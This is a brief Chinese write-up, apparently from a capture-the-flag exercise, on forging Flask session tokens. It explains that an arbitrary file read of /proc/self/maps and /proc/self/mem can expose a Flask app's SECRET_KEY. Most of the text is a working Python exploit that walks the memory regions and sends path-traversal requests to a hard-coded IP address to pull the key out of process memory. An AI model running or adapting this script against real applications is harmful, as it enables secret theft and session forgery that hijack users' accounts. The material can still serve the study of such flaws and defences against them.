python的flask会自动生成session的jwt，需要SECRET_KEY，如果可以任意文件读取，读取内存获取到SECRET_KEY
就可以伪造jwt身份。

```
读内存可读文件
/proc/self/maps
包含了当前进程的内存映射信息。这个文件列出了进程的虚拟内存地址空间中所有的内存区域地址。


Start Address    End Address      Permissions    Offset        Device    Inode   Path
55ef4c197000-55ef4c198000 r--p 00000000 fd:00 87295750 /usr/local/bin/python3.7
55ef4c198000-55ef4c199000 r-xp 00001000 fd:00 8729575


读内存
/proc/self/mem
代表了当前进程的整个内存空间。这个文件可以用来读取或写入进程的内存内容，需要指定地址。
`uuid.uuid4()` 生成的是随机的 UUID（Universally Unique Identifier，通用唯一识别码）。
在 Linux 的 `/proc/self/mem` 文件中，理论上是可以找到由 `uuid.uuid4()` 生成的 UUID 值或flask的SECRET_KEY。
```

```
import re
import requests

# 先文件读取/proc/self/maps文件，保存，在遍历起始截止地址，直到找到python的key格式
maps = open('maps.txt')  # 打开名为 'maps.txt' 的文件并赋值给变量 maps
b = maps.read()  # 读取文件内容并赋值给变量 b
lst = b.split('\\n')  # 根据换行符 '\n' 将文件内容拆分为列表，并赋值给变量 lst，映射表中的内容是一行一行的。

for line in lst:  # 遍历列表 lst 中的每一行内容
    if 'rw' in line:  # 如果当前行包含 'rw'，'rw' 代表该内存区域可读可写，'r'代表可读，'w'代表可写
        addr = re.search('([0-9a-f]+)-([0-9a-f]+)', line)  # 使用正则表达式在当前行中搜索地址范围并保存到变量 addr 中
        start = int(addr.group(1), 16)  # 将地址范围的起始地址从十六进制转换为十进制，并赋值给变量 start
        end = int(addr.group(2), 16)  # 将地址范围的结束地址从十六进制转换为十进制，并赋值给变量 end
        print(start, end)  # 打印起始地址和结束地址

        # 构造请求URL，用于读取 /proc/self/mem 文件的特定区域
        url = f"http://61.147.171.105:54624/info?file=../../../proc/self/mem&start={start}&end={end}"

        # 发送 GET 请求并获取响应
        response = requests.get(url)

        # 使用正则表达式从响应文本中找到符合指定格式的 SECRET_KEY
        secret_key = re.findall("[a-z0-9]{32}\*abcdefgh", response.text)

        # 如果找到了 SECRET_KEY，则打印并结束循环
        if secret_key:
            print(secret_key)
            break
```
